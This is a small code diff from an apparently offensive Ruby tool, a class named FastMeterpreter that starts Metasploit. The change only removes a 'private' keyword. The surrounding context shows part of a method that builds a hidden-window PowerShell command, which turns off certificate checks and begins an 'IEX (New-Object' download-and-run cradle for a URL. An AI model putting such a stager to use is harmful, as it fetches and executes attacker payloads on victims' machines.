@@ -35,8 +35,6 @@ class FastMeterpreter < Skeleton
     @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
   end
 
-  private
-
   def powershell_command(url)
     psh = 'powershell -windowstyle hidden [System.Net.ServicePointManager]::'
     psh << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
